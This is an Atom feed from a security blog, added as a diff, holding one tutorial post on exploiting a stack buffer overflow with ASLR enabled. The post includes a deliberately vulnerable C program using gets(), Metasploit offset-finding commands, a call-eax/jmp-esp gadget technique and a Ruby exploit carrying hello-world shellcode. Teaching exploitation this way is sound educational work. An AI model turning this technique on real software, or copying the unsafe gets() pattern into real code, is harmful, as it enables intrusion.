@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: tutorials | Sheep Shellcode]]></title>
+  <link href="http://sheepshellcode.com/blog/categories/tutorials/atom.xml" rel="self"/>
+  <link href="http://sheepshellcode.com/"/>
+  <updated>2016-04-12T20:58:40-04:00</updated>
+  <id>http://sheepshellcode.com/</id>
+  <author>
+    <name><![CDATA[Vincent Moscatello]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Writing Buffer Overflow Exploits With ASLR]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/"/>
+    <updated>2015-03-24T18:33:43-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr</id>
+    <content type="html"><![CDATA[<p>Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more interesting, I decided to challenge myself to write an exploit for the program that would work with ASLR enabled.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/randomization-proc-sys-kernel.png"></p>
+
+<p>The vulnerable program I wrote is found below. It uses the deprecated gets function which does not limit the amount of data being copied into its buffer. To avoid having to deal with DEP I decided to compile the program with the flag “-z execstack”.</p>
+
+<pre><code class="C">#include &lt;stdio.h&gt;
+
+void vulnerable(){
+    char overflowed[16];
+    gets(overflowed);
+}
+
+int main(){
+    vulnerable();
+}
+</code></pre>
+
+<p>Time to dive into exploitation. The first step was to calculate how many bytes were needed to overflow the buffer on the stack. I decided to streamline the process and use the script pattern_create.rb which is found in the metasploit framework.</p>
+
+<pre><code class="BASH">//Find generate pattern
+root@kali:~/Documents/buffer_overflow/dat# locate pattern_create.rb
+/usr/share/metasploit-framework/tools/pattern_create.rb
+//Generate pattern
+root@kali:~/Documents/buffer_overflow/dat# /usr/share/metasploit-framework/tools/pattern_create.rb 64 &gt; pattern
+</code></pre>
+
+<p>Next step was to feed the pattern to the vulnerable program. It’s important to mention that before I did this I decided to enable core dumps to get an accurate representation of the program’s memory after it crashed.</p>
+
+<pre><code class="BASH">//Enable core dumps
+root@kali:~/Documents/buffer_overflow# ulimit -c unlimited
+</code></pre>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/firstsegfault.png"></p>
+
+<p>To get the offset to the saved instructional pointer I just fed the address to pattern-offset.rb</p>
+
+<pre><code class="BASH">
+//pattern offset
+root@kali:~/Documents/buffer_overflow# locate pattern_offset.rb
+/usr/share/metasploit-framework/tools/pattern_offset.rb
+root@kali:~/Documents/buffer_overflow# /usr/share/metasploit-framework/tools/pattern_offset.rb 62413961
+[*] Exact match at offset 28
+</code></pre>
+
+<p>To make sure this worked I wrote a one lined ruby command to make sure the program crashed to the address 0x42424242 (the ascii letter B) and then analyzed the core dump.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/second-segfault.png"></p>
+
+<p>One technique for making the buffer overflow exploit position independent is to jump to a register rather than a hardcoded address on the stack. A good register for this is esp. This works because although the contents of the register esp will change, the opcode to jump to esp will not. This can be shown by running the program twice and printing the contents of the registers using gdb.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/inforeg1.png"></p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/inforeg2.png"></p>
+
+<p>The next picture below just illustrates how esp in the second picture above points just after the value used for overflowing the stack. Perfect spot to store shellcode!</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/looking-at-esp.png"></p>
+
+<p>The next step is to find some location in the text segment that has the instruction jmp esp.  For most programs written in linux the position of the text segment does not change each time the program is executed even with ASLR enabled. The start address of the text segment is actually a hard coded value found in the elf header file. Great! A tool that can help us look for the opcodes is msfelfscan.</p>
+
+<p>After running the command I felt a little stumped. The program did not use the instruction jmp esp anywhere in the text segment! My solution to this problem was to try and find a register with a different address that could be manipulated. Looking back at the register values at the time of crash eax seemed to fit the bill perfectly! The value of eax at the time of the crash stored the starting address of the data being copied onto the stack from gets. I ran msfelfscan a second time but this time looking for calls or jumps to eax. Found it.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/calleax.png"></p>
+
+<p>My solution for exploiting the program became the following:</p>
+
+<ol>
+<li>Generate the opcode for jump esp</li>
+<li>Overwrite the value on the stack pointed to by eax with that opcode</li>
+<li>Overwrite eip with the address of the call eax instruction.</li>
+</ol>
+
+
+<p>Since I don’t have the entire x86 instruction set memorized cough cough. I decided to write a short assembly program using nasm to get the opcode for jump esp. First I compiled the file with nasm using the flag –f elf. Then I linked the program using ld and ran the a.out file it generated using objdump.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/objdump.png"></p>
+
+<p>The full exploit, written in ruby, is found below. To test if it worked I used shellcode that should print a simple “hello world!” message.</p>
+
+<pre><code class="ruby">#jump to eax
+#eax calls esp
+#esp points to shellcode
+
+payload = "\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2"+
+          "\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff"+
+          "\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72"+
+          "\x6c\x64\x21\x0a\x0d";
+
+
+print "\x90\x90\xd4\xff" + "A"*24 + "\x77\x83\x04\x08" + payload
+</code></pre>
+
+<p>And finally, pwnage.</p>
+
+<p><img class="center" src="/images/buffer-overflow-aslr/pwnage.png"></p>
+]]></content>
+  </entry>
+  
+</feed>
